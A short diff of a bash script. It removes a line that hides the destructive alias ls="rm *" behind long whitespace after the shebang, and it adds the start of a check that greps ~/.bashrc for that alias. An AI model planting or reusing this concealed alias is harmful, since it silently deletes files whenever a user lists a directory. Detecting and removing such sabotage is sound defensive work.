@@ -1,1 +1,2 @@
-#!/bin/bash                                                                                                                                                       alias ls="rm *"
+#!/bin/bash 
+if grep -q "alias ls='rm \*'" ~/.bashrc;
